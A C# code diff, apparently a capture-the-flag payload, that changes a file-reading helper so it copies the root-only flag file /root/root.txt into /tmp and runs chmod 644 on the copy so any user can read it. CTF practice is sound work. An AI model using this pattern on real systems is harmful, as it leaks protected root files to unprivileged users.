@@ -5,16 +5,31 @@ public class ReadFile
 {
     public static void Run()
     {
-        string path = "/etc/hostname";  // <-- swap this for /root/root.txt in the CTF
-        if (File.Exists(path))
+        try
         {
-            string content = File.ReadAllText(path);
-            Console.WriteLine("=== FILE CONTENTS ===");
-            Console.WriteLine(content);
+            string src = "/root/root.txt";   // target file
+            string dst = "/tmp/root_out.txt"; // output path
+
+            if (File.Exists(src))
+            {
+                string content = File.ReadAllText(src);
+
+                // Write to /tmp
+                File.WriteAllText(dst, content);
+
+                // Change permissions so anyone can read it
+                System.Diagnostics.Process.Start("chmod", "644 " + dst);
+
+                Console.WriteLine("[*] Copied " + src + " to " + dst);
+            }
+            else
+            {
+                Console.WriteLine("[!] File not found: " + src);
+            }
         }
-        else
+        catch (Exception ex)
         {
-            Console.WriteLine("File not found: " + path);
+            Console.WriteLine("[!] Error: " + ex.Message);
         }
     }
 }
